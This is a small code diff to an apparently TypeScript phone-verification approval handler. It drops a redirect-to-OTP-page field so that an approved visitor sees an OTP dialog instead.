@@ -102,10 +102,9 @@ export async function handlePhoneVerificationApproval(
   // Update history status
   await updateHistoryStatus(visitorId, historyId, "approved", history)
   
-  // Approve phone verification and proceed to next step (OTP page)
+  // Approve phone verification - visitor will see OTP dialog
   await updateApplication(visitorId, {
-    _v4Status: "approved" as any,
-    redirectPage: "otp" as any
+    _v4Status: "approved" as any
   })
 }
 
